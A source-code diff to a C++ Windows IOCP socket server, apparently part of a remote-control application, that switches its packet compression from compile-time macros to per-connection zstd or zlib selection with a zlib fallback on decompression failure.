@@ -5,44 +5,38 @@
 #include <iostream>
 #include <ws2tcpip.h>
 
-#if USING_ZLIB
+// ZLIB 压缩库
 #include "zlib/zlib.h"
-#define Z_FAILED(p) (Z_OK != (p))
-#define Z_SUCCESS(p) (!Z_FAILED(p))
-#else
+
 #if USING_LZ4
 #include "lz4/lz4.h"
 #pragma comment(lib, "lz4/lz4.lib")
-#define Z_FAILED(p) (0 == (p))
-#define Z_SUCCESS(p) (!Z_FAILED(p))
-#define compress(dest, destLen, source, sourceLen) LZ4_compress_default((const char*)source, (char*)dest, sourceLen, *(destLen))
-#define uncompress(dest, destLen, source, sourceLen) LZ4_decompress_safe((const char*)source, (char*)dest, sourceLen, *(destLen))
-#else
+#define C_FAILED(p) (0 == (p))
+#define C_SUCCESS(p) (!C_FAILED(p))
+#define Mcompress(dest, destLen, source, sourceLen) LZ4_compress_default((const char*)source, (char*)dest, sourceLen, *(destLen))
+#define Muncompress(dest, destLen, source, sourceLen) LZ4_decompress_safe((const char*)source, (char*)dest, sourceLen, *(destLen))
+#else // ZSTD
 #include "zstd/zstd.h"
 #ifdef _WIN64
 #pragma comment(lib, "zstd/zstd_x64.lib")
 #else
 #pragma comment(lib, "zstd/zstd.lib")
 #endif
-#define Z_FAILED(p) ZSTD_isError(p)
-#define Z_SUCCESS(p) (!Z_FAILED(p))
+#define C_FAILED(p) ZSTD_isError(p)
+#define C_SUCCESS(p) (!C_FAILED(p))
 #define ZSTD_CLEVEL 5
 #if USING_CTX
-#define compress(dest, destLen, source, sourceLen) ZSTD_compress2(m_Cctx, dest, *(destLen), source, sourceLen)
-#define uncompress(dest, destLen, source, sourceLen) ZSTD_decompressDCtx(m_Dctx, dest, *(destLen), source, sourceLen)
+#define Mcompress(dest, destLen, source, sourceLen) ZSTD_compress2(m_Cctx, dest, *(destLen), source, sourceLen)
+#define Muncompress(dest, destLen, source, sourceLen) ZSTD_decompressDCtx(m_Dctx, dest, *(destLen), source, sourceLen)
 #else
-#define compress(dest, destLen, source, sourceLen) ZSTD_compress(dest, *(destLen), source, sourceLen, ZSTD_CLEVEL_DEFAULT)
-#define uncompress(dest, destLen, source, sourceLen) ZSTD_decompress(dest, *(destLen), source, sourceLen)
+#define Mcompress(dest, destLen, source, sourceLen) ZSTD_compress(dest, *(destLen), source, sourceLen, ZSTD_CLEVEL_DEFAULT)
+#define Muncompress(dest, destLen, source, sourceLen) ZSTD_decompress(dest, *(destLen), source, sourceLen)
 #endif
 #endif
-#endif
+
 using namespace std;
 
 CRITICAL_SECTION IOCPServer::m_cs = {0};
-
-#define HUERISTIC_VALUE 2
-
-#define SAFE_DELETE(p) if(p){ delete (p); (p) = NULL; }
 
 // 根据 socket 获取客户端IP地址.
 std::string GetRemoteIP(SOCKET sock) {
@@ -519,31 +513,41 @@ BOOL IOCPServer::OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans
 				PBYTE CompressedBuffer = new BYTE[ulCompressedLength];  //没有解压
 				//从数据包当前将源数据没有解压读取到pData   448
 				ContextObject->InCompressedBuffer.ReadBuffer(CompressedBuffer, ulCompressedLength);
-#if USING_COMPRESS
+				if (ContextObject->CompressMethod == COMPRESS_UNKNOWN) {
+					delete[] CompressedBuffer;
+					throw "Unknown method";
+				}
+				bool usingZstd = ContextObject->CompressMethod == COMPRESS_ZSTD, zlibFailed = false;
 				PBYTE DeCompressedBuffer = new BYTE[ulOriginalLength];  //解压过的内存  436
-				size_t	iRet = uncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength);
-#else
-				PBYTE DeCompressedBuffer = CompressedBuffer;
-				int iRet = 0;
-#endif
-				if (Z_SUCCESS(iRet))
+				size_t	iRet = usingZstd ?
+					Muncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength) :
+					uncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength);
+				if (usingZstd ? C_SUCCESS(iRet) : (S_OK==iRet))
 				{
 					ContextObject->InDeCompressedBuffer.ClearBuffer();
 					//ContextObject->InCompressedBuffer.ClearBuffer();
 					ContextObject->InDeCompressedBuffer.WriteBuffer(DeCompressedBuffer, ulOriginalLength);
 					m_NotifyProc(ContextObject);  //通知窗口
-				}else{
-					OutputDebugStringA("[ERROR] uncompress failed \n");
-					delete [] CompressedBuffer;
-#if USING_COMPRESS // 释放内存
-					delete [] DeCompressedBuffer;
-#endif
-					throw "Bad Buffer";
+				}else if (usingZstd){
+					// 尝试用zlib解压缩
+					if (Z_OK == uncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength)) {
+						ContextObject->CompressMethod = COMPRESS_ZLIB;
+						ContextObject->InDeCompressedBuffer.ClearBuffer();
+						ContextObject->InDeCompressedBuffer.WriteBuffer(DeCompressedBuffer, ulOriginalLength);
+						m_NotifyProc(ContextObject);
+					} else {
+						zlibFailed = true;
+						ContextObject->CompressMethod = COMPRESS_UNKNOWN;
+					}
+				} else {
+					zlibFailed = true;
 				}
 				delete [] CompressedBuffer;
-#if USING_COMPRESS // 释放内存
 				delete [] DeCompressedBuffer;
-#endif
+				if (zlibFailed) {
+					OutputDebugStringA("[ERROR] ZLIB uncompress failed \n");
+					throw "Bad Buffer";
+				}
 			}else{
 				break;
 			}
@@ -577,25 +581,31 @@ VOID IOCPServer::OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffe
 	{
 		if (ulOriginalLength > 0)
 		{
-#if USING_ZLIB
-			unsigned long	ulCompressedLength = (double)ulOriginalLength * 1.001  + 12;
-#elif USING_LZ4
+			if (ContextObject->CompressMethod == COMPRESS_UNKNOWN) {
+				OutputDebugStringA("[ERROR] UNKNOWN compress method \n");
+				return;
+			}
+			bool usingZstd = ContextObject->CompressMethod == COMPRESS_ZSTD;
+#if USING_LZ4
 			unsigned long	ulCompressedLength = LZ4_compressBound(ulOriginalLength);
 #else
-			unsigned long	ulCompressedLength = ZSTD_compressBound(ulOriginalLength);
+			unsigned long	ulCompressedLength = usingZstd ? 
+				ZSTD_compressBound(ulOriginalLength) : (double)ulOriginalLength * 1.001 + 12;
 #endif
 			LPBYTE			CompressedBuffer = new BYTE[ulCompressedLength];
-			size_t	iRet = compress(CompressedBuffer, &ulCompressedLength, (LPBYTE)szBuffer, ulOriginalLength);
+			size_t	iRet = usingZstd ?
+				Mcompress(CompressedBuffer, &ulCompressedLength, (LPBYTE)szBuffer, ulOriginalLength):
+				compress(CompressedBuffer, &ulCompressedLength, (LPBYTE)szBuffer, ulOriginalLength);
 
-			if (Z_FAILED(iRet))
+			if (usingZstd ? C_FAILED(iRet) : (S_OK != iRet))
 			{
 				OutputDebugStringA("[ERROR] compress failed \n");
 				delete [] CompressedBuffer;
 				return;
 			}
-#if !USING_ZLIB
-			ulCompressedLength = iRet;
-#endif
+
+			ulCompressedLength =  usingZstd ? iRet : ulCompressedLength;
+
 			ULONG ulPackTotalLength = ulCompressedLength + HDR_LENGTH;
 			ContextObject->OutCompressedBuffer.WriteBuffer((LPBYTE)m_szPacketFlag,FLAG_LENGTH);
 			ContextObject->OutCompressedBuffer.WriteBuffer((PBYTE)&ulPackTotalLength, sizeof(ULONG));
